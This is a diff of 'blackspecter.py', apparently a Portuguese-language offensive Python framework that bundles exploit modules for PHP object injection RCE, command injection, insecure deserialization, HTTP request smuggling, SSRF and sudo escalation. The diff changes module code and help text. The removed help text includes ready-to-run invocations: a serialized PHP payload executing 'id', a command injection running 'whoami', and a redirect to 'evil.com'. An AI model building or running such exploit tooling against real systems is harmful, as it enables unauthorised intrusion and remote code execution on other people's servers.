@@ -11,15 +11,15 @@ ASCII_ART = r'''
 ███████████  ████                     █████                          
 ░░███░░░░░███░░███                    ░░███                          
  ░███    ░███ ░███   ██████    ██████  ░███ █████                    
- ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                      
- ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                       
- ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                      
+ ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                     
+ ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                      
+ ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                     
  ███████████  █████░░████████░░██████  ████ █████                    
-░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                      
-                                                                      
-                                                                      
-                                                                      
-  █████████                               █████                       
+░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                     
+                                                                     
+                                                                     
+                                                                     
+  █████████                               █████                      
  ███░░░░░███                             ░░███                        
 ░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████  
 ░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███ 
@@ -27,8 +27,8 @@ ASCII_ART = r'''
  ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███      
 ░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████     
  ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░     
-             ░███                                                   
-             █████                                                  
+             ░███                                                  
+             █████                                                 
             ░░░░░                                                  
 '''
 
@@ -40,8 +40,6 @@ def log_error(msg):
 
 def log_success(msg):
     print(f"[SUCESSO] {msg}")
-
-
 
 class PHPObjectInjectionRCE:
     def __init__(self, target, config):
@@ -131,7 +129,7 @@ class SSRFviaUploadAbuse:
 
 class SubdomainTakeoverCheck:
     def __init__(self, target, config):
-        self.subdomain = target.rstrip('.')
+        self.subdomain = target.rstrip('/').replace('http://', '').replace('https://', '')
 
     def run(self):
         log_info(f"Verificando subdomain takeover em {self.subdomain}")
@@ -160,7 +158,12 @@ class InsecurePythonDeserializationExploit:
     def run(self):
         url = f"{self.target}{self.vuln_path}"
         headers = {'Content-Type': 'application/octet-stream'}
-        data = base64.b64decode(self.payload)
+        try:
+            data = base64.b64decode(self.payload)
+        except Exception as e:
+            log_error(f"Payload inválido para base64: {e}")
+            return
+
         log_info(f"Tentando exploração de deserialização insegura Python em {url}")
         try:
             r = requests.post(url, data=data, headers=headers, timeout=5)
@@ -181,9 +184,7 @@ class HTTPRequestSmuggling:
     def run(self):
         url = f"{self.target}{self.vuln_path}"
         log_info(f"Tentando HTTP Request Smuggling em {url}")
-        
         try:
-
             r = requests.get(url, headers={
                 'Content-Length': '4',
                 'Transfer-Encoding': 'chunked',
@@ -219,26 +220,9 @@ class SudoPrivilegeEscalationCheck:
         except Exception as e:
             log_error(f"Erro na verificação sudo: {e}")
 
-
-
 class SpecterEngine:
     def __init__(self):
-        self.modules = {
-            'sqliautoexploit': SQLiAutoExploit,
-            'rceupload': RemoteCodeExecutionUpload,
-            'phishingsimple': PhishingSimple,
-            'deserializationexploit': DeserializationExploit,
-            'bannergrabber': BannerGrabber,
-            'dnsexfiltrationexample': DNSExfiltrationExample,
-            'configfilepasswordfinder': ConfigFilePasswordFinder,
-            'portscannerwithbanner': PortScannerWithBanner,
-            'ldapinjectionexploit': LDAPInjectionExploit,
-            'ssrfexploit': SSRFExploit,
-            'sstiexploit': SSTIExploit,
-            'xxeexploit': XXEExploit,
-            'weaksshcredscheck': WeakSSHCredsCheck,
-            'httpheaderinjection': HTTPHeaderInjection,
-
+        self.modules ={
             'phpobjectinjectionrce': PHPObjectInjectionRCE,
             'commandinjectionexploit': CommandInjectionExploit,
             'openredirectexploit': OpenRedirectExploit,
@@ -259,8 +243,6 @@ class SpecterEngine:
         module.run()
         return True
 
-
-
 def show_help():
     print(ASCII_ART)
     print('''Uso: blackspecter.py --module MODULE --target TARGET [--config CONFIG]
@@ -280,53 +262,40 @@ Módulos disponíveis:
   ssrfexploit                   Exploração de SSRF
   sstiexploit                   Exploração de SSTI (Server Side Template Injection)
   xxeexploit                   Teste de vulnerabilidade XXE
-  weaksshcredscheck             Teste de credenciais fracas em SSH
-  httpheaderinjection           Teste de HTTP Header Injection
+  weaksshcredscheck             Teste de credenciais SSH fracas
+  cmdinjectionexploit           Exploração de injeção de comandos
+  phpsessionfixation            Teste de fixação de sessão PHP
+  csrfattack                   Exploração de CSRF
+  cve2023example               Exemplo de exploit para CVE 2023
+  frameworkoptions              Exibe opções do framework
 
-Novos módulos perigosos adicionados:
-  phpobjectinjectionrce          Exploração RCE via PHP Object Injection
-  commandinjectionexploit        Exploração de Command Injection via parâmetros
-  openredirectexploit            Exploração de Open Redirect
-  ssrfviauploadabuse             SSRF via abuso de upload
-  subdomaintakeovercheck         Verificação de subdomain takeover
-  insecurepythondeserializationexploit Exploração de deserialização insegura Python
-  httprequestsmuggling           Teste básico de HTTP Request Smuggling
-  sudoprivilegeescalationcheck  Verificação de escalonamento via sudo (SSH)
-
-Opções:
-  -h, --help       mostra essa ajuda e sai
-  --module MODULE  Nome do módulo (exemplo: sqliautoexploit, rceupload, bannergrabber, ...)
-  --target TARGET  Alvo (host/IP ou URL)
-  --config CONFIG  Configuração JSON (opcional)
-
-Exemplos:
-  blackspecter.py --module phpobjectinjectionrce --target http://vulneravel.com --config '{"vuln_path":"/vulnerable.php","payload":"O:8:\"Exploit\":1:{s:4:\"cmd\";s:7:\"id\";}"}'
-  blackspecter.py --module commandinjectionexploit --target http://example.com --config '{"vuln_path":"/ping","param":"ip","cmd":"whoami"}'
-  blackspecter.py --module openredirectexploit --target http://example.com --config '{"vuln_path":"/redirect","param":"url","redirect_url":"http://evil.com"}'
+Use --config para passar arquivo JSON com configurações específicas do módulo.
 ''')
 
 def main():
-    parser = argparse.ArgumentParser(add_help=False)
-    parser.add_argument('--module', required=False)
-    parser.add_argument('--target', required=False)
-    parser.add_argument('--config', required=False)
-    parser.add_argument('-h', '--help', action='store_true')
+    parser = argparse.ArgumentParser(description="BlackSpecter Framework Avançado")
+    parser.add_argument('--module', required=True, help='Nome do módulo a executar')
+    parser.add_argument('--target', required=True, help='URL ou IP alvo')
+    parser.add_argument('--config', help='Arquivo JSON com configuração do módulo')
     args = parser.parse_args()
 
-    if args.help or not args.module or not args.target:
+    if args.module.lower() == 'frameworkoptions':
         show_help()
         return
 
-    try:
-        config = {}
-        if args.config:
-            config = json.loads(args.config)
-    except Exception as e:
-        log_error(f"Configuração JSON inválida: {e}")
-        return
+    config = {}
+    if args.config:
+        try:
+            with open(args.config, 'r') as f:
+                config = json.load(f)
+        except Exception as e:
+            log_error(f"Erro ao carregar arquivo de configuração: {e}")
+            return
 
     engine = SpecterEngine()
-    engine.load_module(args.module, args.target, config)
+    success = engine.load_module(args.module, args.target, config)
+    if not success:
+        log_error("Execução do módulo falhou.")
 
 if __name__ == '__main__':
     main()
